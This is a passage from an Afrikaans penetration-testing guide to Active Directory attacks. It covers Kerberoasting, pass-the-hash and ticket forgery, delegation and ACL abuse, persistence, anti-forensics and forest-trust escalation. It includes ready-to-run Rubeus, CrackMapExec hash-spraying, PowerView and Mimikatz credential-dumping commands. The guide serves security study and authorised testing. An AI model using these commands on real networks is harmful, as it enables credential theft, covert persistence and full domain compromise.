’n Leesbare kopie van ’n `msDS-ManagedPassword`-blob in ’n lêer, share of rugsteun is ’n afsonderlike blootstellingsroete: die LDAP-lees-ACL kan nie ’n kopie beskerm wat elders gestoor is nie. Bevestig dat die data ’n bestuurdewagwoord-blob is voordat jy dit interpreteer, en onderskei dit van sowel ’n gemagtigde LDAP-lees as afleiding vanaf die KDS-wortelsleutel.

### Kerberoast

Kerberoasting behels die verkryging van **TGS-kaartjies** wat deur dienste gebruik word wat aan gebruikersrekeninge gekoppel is, en die **vanlyn** kraak van hul enkripsie — wat op gebruikerswagwoorde gebaseer is.

Meer hieroor:


{{#ref}}
kerberoast.md
{{#endref}}

### Afstandverbinding (RDP, SSH, FTP, Win-RM, ens.)

Sodra jy geloofsbriewe verkry het, kan jy nagaan of jy toegang tot enige **masjien** het. Hiervoor kan jy **CrackMapExec** gebruik om met verskillende protokolle aan verskeie bedieners te probeer koppel, volgens jou poortskanderings.

### Local Privilege Escalation

As jy gekompromitteerde geloofsbriewe of ’n sessie as ’n gewone domeingebruiker het en toegang tot **enige masjien in die domein** kan kry, soek ’n manier om **voorregte plaaslik te eskaleer en geloofsbriewe in te samel**. Plaaslike administrateurvoorregte kan jou dalk toelaat om **ander gebruikers se hashes** uit geheue (LSASS) en plaaslike berging (SAM) te dump.

Hierdie boek bevat ’n volledige bladsy oor [**voorregte-eskalasie plaaslik in Windows**](../windows-local-privilege-escalation/index.html) en ’n [**kontrolelys**](../checklist-windows-privilege-escalation.md). Moet ook nie vergeet om [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) te gebruik nie.

### Kaartjies van die huidige sessie

Dit is baie **onwaarskynlik** dat jy **kaartjies** in die huidige gebruiker se sessie sal vind wat jou **toestemming gee om toegang te verkry tot** onverwagte hulpbronne, maar jy kan nagaan:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Met domeinbewyse of ’n gebruikersessie, kyk weer na NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): geverifieerde enumerasie- en dwangtegnieke kan relay-paaie blootlê wat tydens ongeverifieerde verkenning nie beskikbaar was nie.

### Soek na Creds in Computer Shares | SMB Shares

Noudat jy ’n paar basiese geloofsbriewe het, moet jy kyk of jy enige **interessante lêers wat binne die AD gedeel word, kan vind**. Jy kan dit handmatig doen, maar dit is ’n baie vervelige, herhalende taak (veral as jy honderde dokumente vind wat jy moet nagaan).

[**Volg hierdie skakel om meer te wete te kom oor nutsmiddels wat jy kan gebruik.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steel NTLM Creds

As jy **toegang tot ander rekenaars of shares** het, kan jy **lêers plaas** (soos ’n SCF-lêer) wat, indien iemand dit op een of ander manier oopmaak, NTLM-verifikasie teen jou sal t**rigger**, sodat jy die **NTLM challenge kan steel** om dit te kraak:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Hierdie kwesbaarheid het enige geverifieerde gebruiker toegelaat om die domeinbeheerder te **compromise**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege-escalation op Active Directory MET bevoorregte credentials/sessie

**Vir die volgende tegnieke is ’n gewone domeingebruiker nie genoeg nie; jy het spesiale regte/geloofsbriewe nodig om hierdie aanvalle uit te voer.**

### Hash-onttrekking

Hopelik het jy daarin geslaag om ’n **plaaslike admin-rekening te compromise** deur AsRepRoast, [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), insluitend relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), of [plaaslik privilege-escalation uit te voer](../windows-local-privilege-escalation/index.html).\
Dan is dit tyd om al die hashes in die geheue en plaaslik te dump.\
[**Lees hierdie bladsy oor verskillende maniere om die hashes te verkry.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sodra jy ’n gebruiker se hash het**, kan jy dit gebruik om die gebruiker **na te boots**.\
Jy moet ’n **tool** gebruik wat NTLM-verifikasie met daardie **hash uitvoer**, **of** jy kan ’n nuwe **sessionlogon** skep en daardie **hash** in die **LSASS** inspuit, sodat daardie **hash gebruik word wanneer enige NTLM-verifikasie uitgevoer word.** Dit is wat mimikatz met die laaste opsie doen.\
[**Lees hierdie bladsy vir meer inligting.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Hierdie aanval is daarop gemik om **die gebruiker se NTLM-hash te gebruik om Kerberos-tickets aan te vra**, as alternatief vir die algemene Pass The Hash-aanval oor die NTLM-protokol. Dit kan dus besonder **nuttig wees in netwerke waar die NTLM-protokol gedeaktiveer is** en slegs **Kerberos as verifikasieprotokol toegelaat word**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In die **Pass The Ticket (PTT)**-aanvalmetode **steel aanvallers ’n gebruiker se verifikasieticket** in plaas van hul wagwoord of hash-waardes. Die gesteelde ticket word dan gebruik om **die gebruiker na te boots**, wat ongemagtigde toegang tot hulpbronne en dienste binne ’n netwerk verleen.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Hergebruik van Credentials

As jy die **hash** of **wagwoord** van ’n **plaaslike administrateur** het, moet jy daarmee probeer om **plaaslik by ander rekenaars aan te meld**.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Let daarop dat dit redelik **noisy** is en dat **LAPS** dit sal **mitigate**.

### MSSQL-misbruik & vertroude skakels

As ’n gebruiker voorregte het om **toegang tot MSSQL-instansies** te kry, kan hy dit moontlik gebruik om **opdragte uit te voer** op die MSSQL-gasheer (indien dit as SA loop), die NetNTLM-**hash** te **steel** of selfs ’n **relay**-**aanval** uit te voer.\
As ’n MSSQL-instansie deur ’n databasis-skakel deur ’n ander instansie vertrou word, kan ’n gebruiker met voorregte oor die gekoppelde databasis moontlik **die vertrouensverhouding gebruik om navrae op die ander instansie uit te voer**. Hierdie vertrouensverhoudings kan aan mekaar geskakel word en kan uiteindelik ’n verkeerd opgestelde databasis bereik waar die gebruiker opdragte kan uitvoer.\
**Die skakels tussen databasisse werk selfs oor forest trust-verhoudings heen.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Misbruik van IT-bate-/ontplooiingsplatforms

Derdeparty-inventaris- en ontplooiingsuites bied dikwels kragtige roetes na geloofsbriewe en kode-uitvoering. Sien:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Onbeperkte Delegation

As jy enige Computer-objek vind met die attribuut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) en jy domeinvoorregte op die rekenaar het, sal jy TGTs uit die geheue kan dump van elke gebruiker wat by die rekenaar aanmeld.\
Dus, as ’n **Domain Admin by die rekenaar aanmeld**, sal jy sy TGT kan dump en hom kan naboots met [Pass the Ticket](pass-the-ticket.md).\
Danksy constrained delegation kan jy selfs **outomaties ’n Print Server kompromitteer** (hopelik sal dit ’n DC wees).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Beperkte Delegation

As ’n gebruiker of rekenaar toegelaat word vir "Constrained Delegation", sal dit **enige gebruiker kan naboots om toegang tot sekere dienste op ’n rekenaar te kry**.\
As jy dan die **hash** van hierdie gebruiker/rekenaar **kompromitteer**, sal jy **enige gebruiker** (selfs domeinadministrateurs) kan **naboots** om toegang tot sekere dienste te kry.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Hulpbron-gebaseerde Constrained Delegation

As jy **WRITE**-voorreg op ’n Active Directory-objek van ’n afgeleë rekenaar het, kan jy kode-uitvoering met **verhoogde voorregte** verkry:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Misbruik van Permissions/ACLs

Die gekompromitteerde gebruiker kan dalk **interessante voorregte oor sekere domeinobjekte** hê wat jou lateraal kan laat **beweeg**/**voorregte laat eskaleer**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Misbruik van die Printer Spooler-diens

As jy ’n **Spool-diens ontdek wat binne die domein luister**, kan dit **misbruik** word om **nuwe geloofsbriewe te verkry** en **voorregte te eskaleer**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Misbruik van derdeparty-sessies

As **ander gebruikers** toegang tot die **gekompromitteerde** masjien kry, is dit moontlik om **geloofsbriewe uit die geheue te versamel** en selfs **beacons in hul prosesse in te spuit** om hulle na te boots.\
Gebruikers kry gewoonlik toegang tot die stelsel via RDP; hier is dus hoe om ’n paar aanvalle op derdeparty-RDP-sessies uit te voer:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** bied ’n stelsel vir die bestuur van die **plaaslike Administrator-wagwoord** op domeingekoppelde rekenaars, en verseker dat dit **gerandomiseer**, uniek en gereeld **verander** word. Hierdie wagwoorde word in Active Directory gestoor en toegang word deur ACLs beperk tot slegs gemagtigde gebruikers. Met voldoende voorregte om toegang tot hierdie wagwoorde te kry, word dit moontlik om na ander rekenaars oor te skakel.


{{#ref}}
laps.md
{{#endref}}

### Sertifikaatdiefstal

Vir AD CS-registrasie, sertifikaatkartering en enumerasie voordat jy sertifikaatdiefstal of misbruik van templates aanpak, sien die [AD Certificates-oorsig](ad-certificates.md).

**Die versameling van sertifikate** vanaf die gekompromitteerde masjien kan ’n manier wees om voorregte binne die omgewing te eskaleer:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Misbruik van sertifikaattemplates

As **kwesbare templates** opgestel is, is dit moontlik om dit te misbruik om voorregte te eskaleer:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Na-uitbuiting met ’n rekening met hoë voorregte

### Dumping van domeingeloofsbriewe

Sodra jy **Domain Admin**- of, nog beter, **Enterprise Admin**-voorregte verkry, kan jy die **domeindatabasis**: _ntds.dit_ **dump**.

[**Meer inligting oor die DCSync-aanval is hier beskikbaar**](dcsync.md).

[**Meer inligting oor hoe om die NTDS.dit te steel is hier beskikbaar**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

’n Leesbare rugsteunargief wat `ntds.dit` saam met die `SYSTEM`-hive bevat, moet as blootgestelde Active Directory-materiaal beskou word nog voordat dit uitgepak word. ’n Verouderde wagwoordhash beteken nie dat ander objekkenmerke veilig is nie: velde soos `description` kan geloofsbriewe of operasionele notas bevat. Gaan eers die lêername van die argief se lede na en hou die inhoud van uitgepakte databasisse buite gewone enumerasie-uitvoer.

### Privilege-escalation as persistence

Sommige van die tegnieke wat vroeër bespreek is, kan vir persistence gebruik word.\
Jy kan byvoorbeeld:

- Gebruikers kwesbaar maak vir [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Maak gebruikers kwesbaar vir [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Ken ’n gebruiker [**DCSync**](#dcsync)-voorregte toe.

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

Die **Silver Ticket-aanval** skep ’n **geldige Ticket Granting Service (TGS)-kaartjie** vir ’n spesifieke diens deur die **NTLM-hash** te gebruik (byvoorbeeld die **hash van die rekenaarrekening**). Hierdie metode word gebruik om **toegang tot die diens se regte te verkry**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

’n **Golden Ticket-aanval** behels dat ’n aanvaller toegang verkry tot die **NTLM-hash van die krbtgt-rekening** in ’n Active Directory (AD)-omgewing. Hierdie rekening is spesiaal omdat dit gebruik word om alle **Ticket Granting Tickets (TGTs)** te onderteken, wat noodsaaklik is vir stawing binne die AD-netwerk.

Sodra die aanvaller hierdie hash verkry, kan hulle **TGTs** skep vir enige rekening wat hulle kies (Silver Ticket-aanval).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Dit is soos golden tickets, maar word vervals op ’n manier wat **algemene opsporingsmeganismes vir golden tickets omseil.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Om sertifikate van ’n rekening te hê of dit te kan aanvra** is ’n baie goeie manier om volgehoue toegang tot ’n gebruiker se rekening te behou (selfs al verander hy sy wagwoord):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Dit is ook moontlik om sertifikate te gebruik om volgehoue toegang met hoë regte binne die domein te behou:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Die **AdminSDHolder**-objek in Active Directory verseker die sekuriteit van **bevoorregte groepe** (soos Domain Admins en Enterprise Admins) deur ’n standaard **Access Control List (ACL)** op hierdie groepe toe te pas om ongemagtigde veranderinge te voorkom. Hierdie funksie kan egter uitgebuit word; as ’n aanvaller die AdminSDHolder se ACL wysig om ’n gewone gebruiker volle toegang te gee, verkry daardie gebruiker uitgebreide beheer oor alle bevoorregte groepe. Hierdie sekuriteitsmaatreël, wat bedoel is om te beskerm, kan dus die teenoorgestelde uitwerking hê en ongemagtigde toegang moontlik maak, tensy dit noukeurig gemonitor word.

[**Meer inligting oor die AdminDSHolder Group hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Binne elke **Domain Controller (DC)** bestaan daar ’n **plaaslike administrateur**-rekening. Deur administrateurregte op so ’n masjien te verkry, kan die plaaslike Administrator-hash met **mimikatz** onttrek word. Daarna is ’n registerwysiging nodig om **die gebruik van hierdie wagwoord te aktiveer**, wat afstandtoegang tot die plaaslike Administrator-rekening moontlik maak.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Jy kan ’n gebruiker **spesiale regte gee** oor spesifieke domeinobjekte, wat die gebruiker in staat sal stel om **in die toekoms regte te eskaleer**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **security descriptors** word gebruik om die **regte** wat ’n **objek** **oor** ’n **objek** het, **te stoor**. As jy ’n **klein verandering** aan die **security descriptor** van ’n objek kan **aanbring**, kan jy baie interessante regte oor daardie objek verkry sonder om lid van ’n bevoorregte groep te hoef te wees.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Misbruik die hulpklas `dynamicObject` om kortstondige principals/GPOs/DNS records met `entryTTL`/`msDS-Entry-Time-To-Die` te skep; hulle verwyder hulself sonder tombstones en wis LDAP-bewyse uit, terwyl verweesde SIDs, gebroke `gPLink`-verwysings of DNS-antwoorde uit die kas agterbly (bv. AdminSDHolder ACE-besoedeling of kwaadwillige `gPCFileSysPath`/AD-geïntegreerde DNS-aansture).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verander **LSASS** in die geheue om ’n **universele wagwoord** te vestig, wat toegang tot alle domeinrekeninge verleen.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Leer hier wat ’n SSP (Security Support Provider) is.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Jy kan jou **eie SSP** skep om die **credentials** wat gebruik word om toegang tot die masjien te verkry, in **clear text** vas te lê.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dit registreer ’n **nuwe Domain Controller** in die AD en gebruik dit om **attribute** (SIDHistory, SPNs...) na gespesifiseerde objekte te **stuur**, **sonder** om enige **logs** oor die **wysigings** agter te laat. Jy **benodig DA**-regte en moet binne die **root domain** wees.\
Let daarop dat as jy verkeerde data gebruik, baie lelike logs sal verskyn.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Ons het voorheen bespreek hoe om regte te eskaleer as jy **genoeg regte het om LAPS-wagwoorde te lees**. Hierdie wagwoorde kan egter ook gebruik word om **volgehoue toegang te behou**.\
Kyk na:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft beskou die **Forest** as die sekuriteitsgrens. Dit beteken dat **die kompromittering van ’n enkele domein moontlik daartoe kan lei dat die hele Forest gekompromitteer word**.<sup>[[1]](#references)</sup>

### Basic Information

’n [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is ’n sekuriteitsmeganisme wat ’n gebruiker van een **domein** in staat stel om toegang te verkry tot hulpbronne in ’n ander **domein**. Dit skep in wese ’n skakel tussen die stawingstelsels van die twee domeine, sodat stawingsverifikasies naatloos kan plaasvind. Wanneer domeine ’n trust opstel, ruil hulle spesifieke **sleutels** uit en bewaar dit binne hul **Domain Controllers (DCs)**. Hierdie sleutels is noodsaaklik vir die integriteit van die trust.

In ’n tipiese scenario, as ’n gebruiker toegang tot ’n diens in ’n **trusted domain** wil verkry, moet hulle eers ’n spesiale kaartjie, bekend as ’n **inter-realm TGT**, by hul eie domein se DC aanvra. Hierdie TGT word met ’n gedeelde **sleutel** geënkripteer waaroor beide domeine ooreengekom het. Die gebruiker bied dan hierdie TGT aan die **DC van die trusted domain** om ’n dienskaartjie (**TGS**) te kry. Nadat die trusted domain se DC die inter-realm TGT suksesvol gevalideer het, reik dit ’n TGS uit wat die gebruiker toegang tot die diens verleen.

**Stappe**:

1. ’n **Kliëntrekenaar** in **Domain 1** begin die proses deur sy **NTLM-hash** te gebruik om ’n **Ticket Granting Ticket (TGT)** by sy **Domain Controller (DC1)** aan te vra.
2. DC1 reik ’n nuwe TGT uit as die kliënt suksesvol geverifieer word.
3. Die kliënt vra dan ’n **inter-realm TGT** by DC1 aan, wat nodig is om toegang tot hulpbronne in **Domain 2** te verkry.
4. Die inter-realm TGT word geënkripteer met ’n **trust key** wat DC1 en DC2 as deel van die tweerigting-domain trust deel.
5. Die kliënt neem die inter-realm TGT na **Domain 2 se Domain Controller (DC2)**.
6. DC2 verifieer die inter-realm TGT met sy gedeelde trust key en reik, indien dit geldig is, ’n **Ticket Granting Service (TGS)** uit vir die bediener in Domain 2 waartoe die kliënt toegang wil verkry.
7. Laastens bied die kliënt hierdie TGS aan die bediener, waar dit met die bediener se rekeninghash geënkripteer word, om toegang tot die diens in Domain 2 te verkry.

### Different trusts

Dit is belangrik om daarop te let dat ’n **trust eenrigting of tweerigting kan wees**. In ’n tweerigtingtrust vertrou beide domeine mekaar, maar in ’n **eenrigtingtrust** is een domein die **trusted** domein en die ander die **trusting** domein. In laasgenoemde geval **sal jy slegs toegang tot hulpbronne binne die trusting domain vanaf die trusted domain kan verkry**.

As Domain A Domain B vertrou, is A die trusting domain en B die trusted domain. Verder is dit in **Domain A** ’n **Outbound trust**; en in **Domain B** ’n **Inbound trust**.

**Verskillende trust-verhoudings**

- **Parent-Child Trusts**: Dit is ’n algemene opstelling binne dieselfde forest, waar ’n child domain outomaties ’n tweerigting-, transitive trust met sy parent domain het. Dit beteken in wese dat stawingsversoeke naatloos tussen die parent en child kan vloei.
- **Cross-link Trusts**: Dit staan bekend as “shortcut trusts” en word tussen child domains opgestel om verwysingsprosesse te bespoedig. In komplekse forests moet stawingsverwysings gewoonlik tot by die forest root en dan af na die teikendomein beweeg. Deur cross-links te skep, word die roete verkort, wat veral nuttig is in geografies verspreide omgewings.
- **External Trusts**: Dit word tussen verskillende, onverwante domeine opgestel en is van nature non-transitive. Volgens [Microsoft se dokumentasie](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) is external trusts nuttig om toegang te verkry tot hulpbronne in ’n domein buite die huidige forest wat nie deur ’n forest trust verbind is nie. SID filtering versterk sekuriteit met external trusts.
- **Tree-root Trusts**: Hierdie trusts word outomaties tussen die forest root domain en ’n nuutbygevoegde tree root opgestel. Hoewel dit nie algemeen voorkom nie, is tree-root trusts belangrik om nuwe domeinbome by ’n forest te voeg. Dit stel hulle in staat om ’n unieke domeinnaam te behou en verseker tweerigtingtransitiwiteit. Meer inligting is beskikbaar in [Microsoft se gids](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Hierdie tipe trust is ’n tweerigting-, transitive trust tussen twee forest root domains, en dwing ook SID filtering af om sekuriteitsmaatreëls te versterk.
- **MIT Trusts**: Hierdie trusts word met nie-Windows-, [RFC4120-voldoenende](https://tools.ietf.org/html/rfc4120) Kerberos-domeine opgestel. MIT trusts is ietwat meer gespesialiseerd en is bedoel vir omgewings wat integrasie met Kerberos-gebaseerde stelsels buite die Windows-ekosisteem vereis.

#### Ander verskille in **trust-verhoudings**

- ’n Trust-verhouding kan ook **transitive** wees (A vertrou B, B vertrou C, dus vertrou A vir C) of **non-transitive**.
- ’n Trust-verhouding kan as ’n **bidirectional trust** (beide vertrou mekaar) of as ’n **one-way trust** (slegs een vertrou die ander) opgestel word.

### Aanvalsroete

1. **Enumerate** die trust-verhoudings.
2. Kontroleer of enige **security principal** (gebruiker/groep/rekenaar) **toegang** het tot hulpbronne van die **ander domein**, moontlik via ACE-inskrywings of omdat hulle in groepe van die ander domein is. Soek na **verhoudings tussen domeine** (dit is waarskynlik waarom die trust geskep is).
   1. Kerberoast kan in hierdie geval nog ’n opsie wees.
3. **Kompromitteer** die **rekeninge** wat tussen domeine kan **pivot**.

Aanvallers wat toegang tot hulpbronne in ’n ander domein het, kan dit via drie hoofmeganismes verkry:

- **Local Group Membership**: Principals kan by plaaslike groepe op masjiene gevoeg word, soos die “Administrators”-groep op ’n bediener, wat hulle aansienlike beheer oor daardie masjien gee.
- **Foreign Domain Group Membership**: Principals kan ook lede wees van groepe in die foreign domain. Die doeltreffendheid van hierdie metode hang egter af van die aard van die trust en die omvang van die groep.
- **Access Control Lists (ACLs)**: Principals kan in ’n **ACL** gespesifiseer word, veral as entiteite in **ACEs** binne ’n **DACL**, wat hulle toegang tot spesifieke hulpbronne gee. Vir diegene wat meer wil leer oor die werking van ACLs, DACLs en ACEs, is die witskrif getiteld “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ’n onmisbare bron.<sup>[[17]](#references)</sup>

### Vind eksterne gebruikers/groepe met regte

Jy kan **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** nagaan om foreign security principals in die domein te vind. Dit sal gebruikers/groepe van **’n eksterne domein/forest** wees.

Jy kan dit in **Bloodhound** of met powerview nagaan:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Voorregte-eskalasie van kind na ouer in ’n forest

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Ander maniere om domeintrustverhoudings te enumereer:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Daar is **2 vertroude sleutels**, een vir _Child --> Parent_ en nog een vir _Parent_ --> _Child_.\
> Jy kan die een wat deur die huidige domein gebruik word daarmee:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskaliseer as Enterprise admin na die child/parent domain deur die trust met SID-History injection te misbruik:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Misbruik skryfbare Configuration NC

Dit is noodsaaklik om te verstaan hoe die Configuration Naming Context (NC) misbruik kan word. Die Configuration NC dien as ’n sentrale bewaarplek vir konfigurasiedata oor ’n forest in Active Directory (AD)-omgewings. Hierdie data word na elke Domain Controller (DC) binne die forest gerepliseer, met skryfbare DC’s wat ’n skryfbare kopie van die Configuration NC onderhou. Om dit te misbruik, moet ’n mens **SYSTEM-regte op ’n DC hê**, verkieslik ’n child DC.

**Koppel GPO aan die root DC-werf**

Die Sites-houer van die Configuration NC bevat inligting oor die werwe van alle domein-aangeslote rekenaars binne die AD-forest. Deur met SYSTEM-regte op enige DC op te tree, kan aanvallers GPO’s aan die root DC-werwe koppel. Hierdie aksie kan die root domain moontlik kompromitteer deur beleide wat op hierdie werwe toegepas word, te manipuleer.

Vir in-diepte inligting kan ’n mens navorsing oor [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) raadpleeg.<sup>[[12]](#references)</sup>

**Kompromitteer enige gMSA in die forest**

Een aanvalvektor behels die teiken van bevoorregte gMSA’s binne die domein. Die KDS Root key, wat noodsaaklik is vir die berekening van gMSA’s se wagwoorde, word binne die Configuration NC gestoor. Met SYSTEM-regte op enige DC is dit moontlik om toegang tot die KDS Root key te verkry en die wagwoorde vir enige gMSA oor die hele forest te bereken.

Gedetailleerde ontleding en stap-vir-stap-leiding is beskikbaar in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Aanvullende gedelegeerde MSA-aanval (BadSuccessor – misbruik van migrasie-attribuut):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Bykomende eksterne navorsing: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema-veranderingsaanval**

Hierdie metode verg geduld en vereis dat daar gewag word totdat nuwe bevoorregte AD-objekte geskep word. Met SYSTEM-regte kan ’n aanvaller die AD Schema wysig om enige gebruiker volle beheer oor alle klasse te gee. Dit kan lei tot ongemagtigde toegang tot en beheer oor nuutgeskepte AD-objekte.

Verdere leesstof is beskikbaar oor [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Van DA na EA met ADCS ESC5**

Die ADCS ESC5-kwesbaarheid teiken beheer oor Public Key Infrastructure (PKI)-objekte om ’n sertifikaatsjabloon te skep wat stawing as enige gebruiker binne die forest moontlik maak. Omdat PKI-objekte in die Configuration NC geleë is, maak die kompromittering van ’n skryfbare child DC die uitvoering van ESC5-aanvalle moontlik.

Meer besonderhede hieroor kan gelees word in [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> In scenario’s sonder ADCS het die aanvaller die vermoë om die nodige komponente op te stel, soos bespreek in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Eksterne Forest-domein - Eenrigting (Inkomend) of tweerigting

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

In hierdie scenario word jou domein deur ’n eksterne domein vertrou, wat jou ongespesifiseerde toestemmings daaroor gee. Jy sal moet vasstel watter prinsipale van jou domein watter toegang tot die eksterne domein het, en dan probeer om dit uit te buit:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterne Woud-domein - Eenrigting (Uitgaande)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

In hierdie scenario **vertrou jou domein** sommige **voorregte** aan 'n prinsipaal van **ander domeine** toe.

Wanneer 'n **domein deur die vertrouende domein vertrou word**, **skep die vertroude domein 'n gebruiker** met 'n **voorspelbare naam** wat die vertroude wagwoord as **wagwoord** gebruik. Dit beteken dat dit moontlik is om **toegang tot 'n gebruiker in die vertrouende domein te kry om by die vertroude domein in te kom**, dit te enumereer en te probeer om nog voorregte te eskaleer:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Nog 'n manier om die vertroude domein te kompromitteer, is om 'n [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) te vind wat in die **teenoorgestelde rigting** van die domeinvertroue geskep is (wat nie baie algemeen is nie).

Nog 'n manier om die vertroude domein te kompromitteer, is om op 'n masjien te wag waar 'n **gebruiker van die vertroude domein kan aanmeld** via **RDP**. Dan kan die aanvaller kode in die RDP-sessieproses inspuit en **van daar af toegang tot die slagoffer se brondomein kry**.\
